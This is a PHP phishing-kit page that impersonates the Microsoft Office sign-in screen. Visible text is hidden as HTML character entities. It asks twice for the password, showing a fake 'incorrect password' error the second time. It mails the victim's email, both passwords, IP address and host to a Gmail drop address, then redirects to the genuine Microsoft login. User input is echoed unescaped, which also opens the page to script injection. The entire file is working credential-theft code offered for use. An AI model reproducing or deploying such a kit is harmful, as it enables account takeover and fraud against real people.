﻿<?php
function Info($user, $pass1, $pass2)
{
  $message  = ".++----------------------==-[ OFFICE LOGIN ]---------------------------++.\n";
  $message .= "Email    : ".$user."\n";
  $message .= "Password1    : ".$pass1."\n";
  $message .= "Password2    : ".$pass2."\n";
  $message .= "Host      : ".$_SERVER['HTTP_HOST']."\n";
  $message .= "IP Address    : ".$_SERVER['REMOTE_ADDR']."\n";
  $message .= ".++----------------------==-[ W3LL STORE ]---------------------------++.\n";

  return $message;
}
if(isset($_POST['pass2'])) {
    $message = Info($_POST['email'],$_POST['pass1'], $_POST["pass2"]);
    $email = "reportasone@gmail.com";
$subject = "result from microsoft";
$headers = "From: omar@hotmail.com <Grace>";
mail($email,$subject,$message,$headers);
echo '<script>window.location = "https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&redirect_uri=https%3A%2F%2Fwww.office.com%2Flanding&response_type=code%20id_token&scope=openid%20profile&response_mode=form_post&nonce=637222277604538661.ZTQ3M2VlOGYtZjQ3NS00YzVmLWFhMGQtNzQ3MDY2OWVjZmVjZDJiZjE4MGYtNjEzZS00NDQ1LTgzMzMtZTc5ZDhmNGUzZDU3&ui_locales=en-US&mkt=en-US&client-request-id=51184aa6-44e1-48e0-94f4-dcc5f18ef846&msafed=0&state=JOYBrhBoX_ysf-eUOYXh1rZNXeHpdsF7me6AB4yd6BcA_LHr2dzDqs-ED58cFnj7MALLMMgrWgIp7FWm275mxlyZmcgsPp7ga8FTVusqZ2u1whnDdDwbI0XF6zbBlk2AsTGSL9PpSkTJp1VG2Yrw3guCqawck5nKPYfp0G3BV7NnMnbqk3Qie9oowqpPtwLhQE2ENH7jRy4CTP6pdFAnJWgfftdZEWDSirunqPNrJFD_xoTrmewEhnxOPEUqqE4gAz-ySsufcDQsMLCUUQdFjZKqR-kRjQbiDvIWI3PWmnoB4Jgp9u_AaTO8yyV9yv8Xcy4onN0CDr-Z3XMxa72k3oT8WD2yqcOlkIMqFyTDF1E&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.3.0.0";</script>';
    
}
?>
<?php
if (!isset($_POST["pass1"])) {
    echo '
<html lang="en">
<head>
    <title>&#83;&#105;&#103;&#110; &#105;&#110; &#116;&#111; &#121;&#111;&#117;&#114; &#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116; &#97;&#99;&#99;&#111;&#117;&#110;&#116;</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="favicon.ico">
    <link rel="stylesheet" href="assets/css/bootstrap.css">
    <link rel="stylesheet" href="assets/css/pass.css">
    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet">
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/popper.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
    <style type="text/css">
        
    </style>
</head>
<body>
  
<div class="container-fluid">
    <div class="row d-flex align-items-center">
        <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
            <div class="card">
                <div class="card-body">
                    
                    <p><a href="login.php"><img src="assets/images/arrow_left.svg">' . $_GET["email"] . '</a></p>
                    <h4>&#69;&#110;&#116;&#101;&#114; &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</h4>
                    <span id="error" class="d-none">&#89;&#111;&#117;&#114; &#97;&#99;&#99;&#111;&#117;&#110;&#116; &#111;&#114; &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100; &#105;&#115; &#105;&#110;&#99;&#111;&#114;&#114;&#101;&#99;&#116;. &#73;&#102; &#121;&#111;&#117; &#100;&#111;&#110;\'&#116; &#114;&#101;&#109;&#101;&#109;&#98;&#101;&#114; &#121;&#111;&#117;&#114; &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;, <a href="#">&#114;&#101;&#115;&#101;&#116; &#105;&#116; &#110;&#111;&#119;.</a></span>
                    <form method="POST" action="#">
                        <div class="form-group">
                            <input type="password" class="form-control" id="pass" name="pass1" placeholder="Password" required><input type="hidden" name="email" value="' . $_GET["email"] . '">
                        </div>
                        <div class="form-group form-check">
                            <label class="form-check-label">
                                <input class="form-check-input" type="checkbox"> &#75;&#101;&#101;&#112; &#109;&#101; &#115;&#105;&#103;&#110;&#101;&#100; &#105;&#110;
                            </label>
                        </div>
                        <p><a href="#">&#70;&#111;&#114;&#103;&#111;&#116; &#109;&#121; &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</a></p>
                        <button type="submit" class="btn float-right">&#83;&#105;&#103;&#110; &#73;&#110;</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="footer">
    <p><img src="assets/images/ellipsis_white.svg"></p>
    <p>&#80;&#114;&#105;&#118;&#97;&#99;&#121; & &#99;&#111;&#111;&#107;&#105;&#101;&#115;</p>
    <p>&#84;&#101;&#114;&#109;&#115; &#111;&#102; &#117;&#115;&#101;</p>
    <p>©<?php echo date(\'Y\'); ?> &#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;</p>
</div>

</body>
</html>'; } 










if (isset($_POST["pass1"])) {
    echo '
<html lang="en">
<head>
    <title>&#83;&#105;&#103;&#110; &#105;&#110; &#116;&#111; &#121;&#111;&#117;&#114; &#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116; &#97;&#99;&#99;&#111;&#117;&#110;&#116;</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="favicon.ico">
    <link rel="stylesheet" href="assets/css/bootstrap.css">
    <link rel="stylesheet" href="assets/css/pass.css">
    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet">
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/popper.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
    <style type="text/css">
        
    </style>
</head>
<body>
  
<div class="container-fluid">
    <div class="row d-flex align-items-center">
        <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
            <div class="card">
                <div class="card-body">
                    
                    <p><a href="login.php"><img src="assets/images/arrow_left.svg">' . $_POST["email"] . '</a></p>
                    <h4>&#69;&#110;&#116;&#101;&#114; &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</h4>
                    <span id="error" class="d-none">&#89;&#111;&#117;&#114; &#97;&#99;&#99;&#111;&#117;&#110;&#116; &#111;&#114; &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100; &#105;&#115; &#105;&#110;&#99;&#111;&#114;&#114;&#101;&#99;&#116;. &#73;&#102; &#121;&#111;&#117; &#100;&#111;&#110;\'&#116; &#114;&#101;&#109;&#101;&#109;&#98;&#101;&#114; &#121;&#111;&#117;&#114; &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;, <a href="#">&#114;&#101;&#115;&#101;&#116; &#105;&#116; &#110;&#111;&#119;.</a></span><sh style="color:red;font-family:sans-serif;">Your account or password is incorrect. If you don\'t remember your password, <a href="https://www.microsoft.com">reset it now</a>.</sh>
                    <form method="POST" action="#">
                        <div class="form-group">
                            <input type="password" class="form-control" id="pass" name="pass2" placeholder="Password" required><input type="hidden" name="pass1" value="' . $_POST["pass1"] . '"><input type="hidden" name="email" value="' . $_POST["email"] . '">
                        </div>
                        <div class="form-group form-check">
                            <label class="form-check-label">
                                <input class="form-check-input" type="checkbox"> &#75;&#101;&#101;&#112; &#109;&#101; &#115;&#105;&#103;&#110;&#101;&#100; &#105;&#110;
                            </label>
                        </div>
                        <p><a href="#">&#70;&#111;&#114;&#103;&#111;&#116; &#109;&#121; &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</a></p>
                        <button type="submit" class="btn float-right">&#83;&#105;&#103;&#110; &#73;&#110;</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="footer">
    <p><img src="assets/images/ellipsis_white.svg"></p>
    <p>&#80;&#114;&#105;&#118;&#97;&#99;&#121; & &#99;&#111;&#111;&#107;&#105;&#101;&#115;</p>
    <p>&#84;&#101;&#114;&#109;&#115; &#111;&#102; &#117;&#115;&#101;</p>
    <p>©<?php echo date(\'Y\'); ?> &#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;</p>
</div>

</body>
</html>'; } 







?>